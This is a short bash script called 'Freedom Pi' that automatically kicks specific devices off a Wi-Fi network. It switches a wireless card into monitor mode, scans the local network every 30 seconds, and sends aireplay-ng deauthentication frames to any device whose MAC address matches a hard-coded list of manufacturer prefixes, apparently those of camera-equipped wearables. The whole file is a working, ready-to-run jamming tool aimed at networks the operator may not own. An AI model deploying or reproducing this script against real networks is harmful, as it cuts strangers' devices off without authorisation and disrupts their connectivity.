#!/bin/bash
#
#Freedom Pi

#Thanks to Julian Oliver's Glasshole for code reference and Arul John for OUI lookup

shopt -s nocasematch # Set shell to ignore case
shopt -s extglob # For non-interactive shell.

NIC=$1 # Your wireless NIC
BSSID=$2 # Network BSSID (exhibition, workplace, park)
MAC=$(/sbin/ifconfig | grep $NIC | head -n 1 | awk '{ print $5 }')
# MAC=$(ip link show "$NIC" | awk '/ether/ {print $2}') # If 'ifconfig' not present.
GGMAC='@(F8:8F:CA:24*|F8:8F:CA:25*|00:CD:FE*|18:AF:61*|CC:44:63*|6C:72:E7*|44:D8:84*|70:56:81*|7C:D1:C3*|F0:DC:E2*|B0:65:BD*|BC:67:78*|68:96:7B*|00:03:47*|00:11:75*|00:13:02*|00:13:E8*|00:13:02*|48:5D:36*|84:85:06*|B4:F0:AB*|10:DD:B1*)' # banned devices 
POLL=30 # Check every 30 seconds

airmon-ng stop mon0 # Pull down any lingering monitor devices
airmon-ng start $NIC # Start a monitor device


while true;
    do  
        for TARGET in $(arp-scan -I $NIC --localnet | grep -o -E \
        '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
           do
               if [[ $TARGET == $GGMAC ]]
                   then
                       echo "Banned Device: "$TARGET
                       echo "De-authing..."
                       aireplay-ng -0 1 -a $BSSID -c $TARGET mon0 
                    else
                        echo $TARGET": is not a banned device"
               fi
           done
           echo "No banned device found"
           sleep $POLL
done
airmon-ng stop mon0